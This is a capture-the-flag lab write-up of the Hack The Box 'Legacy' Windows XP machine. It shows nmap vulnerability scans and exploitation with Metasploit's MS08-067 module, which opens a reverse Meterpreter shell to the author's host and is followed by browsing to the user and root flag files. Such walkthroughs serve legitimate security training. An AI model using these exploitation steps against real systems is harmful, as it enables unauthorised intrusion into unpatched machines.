# Hack The Box - Legacy
## OS - Windows

Legacy's IP address is 10.10.10.4.
I started with an nmap scan.

```
└──╼ $nmap -sC -sV -Pn 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 17:54 PDT
Nmap scan report for 10.10.10.4
Host is up (0.096s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h27m27s, deviation: 2h07m16s, median: -5h57m27s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:40:c4 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-08-14T00:56:53+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.39 seconds

```

Since the machine is named Legacy and nmap output shows WIndows XP for port 445, I ran NSE scripts for port 445. Here, nmap showed weird results, something like "all 1000 ports were filtered." So I reset the machine and started over. This time, everything went smoothly.

```
$nmap -p 445 --script vuln -Pn 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 17:16 PDT
Nmap scan report for 10.10.10.4
Host is up (0.096s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 22.16 seconds

```

The results showed that the machine was vulnerable to MS08-067. Using Metasploit, I searched for the exploit for MS08-067.


```
msfconsole:
msf5 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


msf5 > 

```


So there is a module for MS08-067. I looked at the options. It only needed the RHOSTS setting, which is 10.10.10.4. I set the RHOST and ran the exploit. 

```
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.4:1028) at 2020-08-13 18:00:03 -0700

meterpreter > 

```

Once I got the meterpreter shell, I just browsed through the filesystem to find the flags. There is probably a better way.

```
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > cd ../..
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode                 Size                Type  Last modified                    Name
----                 ----                ----  -------------                    ----
100777/rwxrwxrwx     0                   fil   2017-03-15 22:30:44 -0700        AUTOEXEC.BAT
100666/rw-rw-rw-     0                   fil   2017-03-15 22:30:44 -0700        CONFIG.SYS
40777/rwxrwxrwx      0                   dir   2017-03-15 22:20:29 -0700        Documents and Settings
100444/r--r--r--     0                   fil   2017-03-15 22:30:44 -0700        IO.SYS
100444/r--r--r--     0                   fil   2017-03-15 22:30:44 -0700        MSDOS.SYS
100555/r-xr-xr-x     47564               fil   2008-04-13 13:13:04 -0700        NTDETECT.COM
40555/r-xr-xr-x      0                   dir   2017-03-15 22:20:57 -0700        Program Files
40777/rwxrwxrwx      0                   dir   2017-03-15 22:20:30 -0700        System Volume Information
40777/rwxrwxrwx      0                   dir   2017-03-15 22:18:34 -0700        WINDOWS
100666/rw-rw-rw-     211                 fil   2017-03-15 22:20:02 -0700        boot.ini
100444/r--r--r--     250048              fil   2008-04-13 15:01:44 -0700        ntldr
226001544/r-xr--r--  157059394872311791  fif   4986018401-02-25 01:21:04 -0800  pagefile.sys


meterpreter > cd Documents\ and\ Settings
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-15 23:07:20 -0700  Administrator
40777/rwxrwxrwx  0     dir   2017-03-15 22:20:29 -0700  All Users
40777/rwxrwxrwx  0     dir   2017-03-15 22:20:29 -0700  Default User
40777/rwxrwxrwx  0     dir   2017-03-15 22:32:52 -0700  LocalService
40777/rwxrwxrwx  0     dir   2017-03-15 22:32:42 -0700  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-15 22:33:41 -0700  john

meterpreter > cd john



```


On John's Desktop, I found the flag.

```
meterpreter > cd Desktop
lsmeterpreter > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-15 23:19:32 -0700  user.txt

meterpreter > cat user.txt

 

```

The same way, I browsed to the Administrator's Desktop.

```
meterpreter > cd Desktop 
lmeterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-15 23:18:19 -0700  root.txt

meterpreter > 


meterpreter > cat root.txt 
```
